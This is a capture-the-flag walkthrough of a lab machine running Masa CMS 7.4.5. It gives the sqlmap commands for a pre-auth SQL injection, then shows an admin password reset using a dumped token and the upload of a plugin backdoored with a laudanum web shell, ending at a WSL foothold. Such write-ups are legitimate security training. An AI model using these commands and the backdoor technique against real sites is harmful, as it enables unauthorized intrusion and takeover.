[{"content":"Fullpwn - Freedom In these challenging times, the voices of freedom are growing fainter. Help us identify potential vulnerabilities in our systems so we can safeguard them against the Frontier Board, which seeks to silence any dissenting opinions. Allow up to 3 minutes for all the services to properly boot.\nUser Enumeration starting with port canning, we found that the machine are running Windows due to kerberos port (88) opened.\nWeb Application I started to enumerate web apps, which redirected into /index.cfm. cfm file extension are used for ColdFusion. there\u0026rsquo;s nothing much in the landing page, which then i decided to perform directory scan. Here i found several interesting results such as /README.md and /admin In the README.md files, i found that web application running Masa CMS if we try to open the /admin path, then we can also confirm that Masa CMS is being used. continuing with the directory scan, i found other interesting files named box.json. It seems like version 7.4.5 or Masa CMS is being used right now.\nMasaCMS Exploit After searching for known exploit of Masa CMS, i found this interesting article by projectdiscovery which disclose about pre-auth sql injection in Masa CMS version 7.4.5. Perfect!\nThey also provide attack scenario to obtain RCE in the Masa CMS as well. Based on the article, it seems like the Masa CMS are vulnerable to error-based SQL Injection. So i use sqlmap to dump the database.\n1 sqlmap \u0026#34;http://freedom.htb/index.cfm/_api/json/v1/default/?method=processAsyncObject\u0026amp;object=displayregion\u0026amp;contenthistid=x\u0026amp;previewID=x\u0026#34; -p contenthistid --level 5 --risk 3 --technique=E --prefix=\u0026#34;%5c\u0026#39;\u0026#34; --batch Alternatively, we can also view the database schema in the source code.\nIn order to achieve RCE, we need to reset user password. I use following command to dump user lists from database.\n1 sqlmap \u0026#34;http://freedom.htb/index.cfm/_api/json/v1/default/?method=processAsyncObject\u0026amp;object=displayregion\u0026amp;contenthistid=x\u0026amp;previewID=x\u0026#34; -p contenthistid --level 5 --risk 3 --technique=E --prefix=\u0026#34;x%5c\u0026#39;\u0026#34; --batch --dump -D dbMasaCMS -T tusers it seems like admin email was admin@freedom.htb\nusing the email address, we can invoke password reset from the /admin endpoint.\nAfter that, we need to obtain reset token and user id from database. We didn\u0026rsquo;t know where exactly the value is, and try to dump all table in dbMasaCMS database instead.\nAfter waiting for a while, we found interesting output within tredirects table.\nThe url can be used to reset admin password, nice!\nCrafting MuraCMS Plugin in order to obtain code execution, we need to upload our own plugin. This can be performed under Plugins \u0026gt; Add Plugin menu. I was lazy to create the plugin from scratch, so i decided to search for public available plugin, which i found from the MasaCMS repository itself\nI replace the content of MasaGoogleSitemaps-main\\admin\\views\\main\\default.cfm using backdoor shell from laudanum.\nThen i zip the plugin content and uploaded it. However, it shows error like this.\nFortunately, this error can be ignored. I just need to back to previous page and click for update button.\nVoila, plugin is uploaded! To access the plugin, click on it\u0026rsquo;s name This will redirect into /plugins/MasaGoogleSitemaps/ with forbidden result, what?? Luckily, we can remove the restriction by appending /index.cfm to the site. Shell is now opened, however we can\u0026rsquo;t see the content due to access restriction in the shell itself. We need to set X-Auth-Code header with value taken from the source code. Shell can be accessed now WSL Escape? When i execute whoami, it returning root instead of windows user?? I easily guess that this is probably wsl. Using mount command, i found that this is indeed an wsl intances that mounting drive C:\\ from windows. We can access windows file\u0026rsquo;s from it.
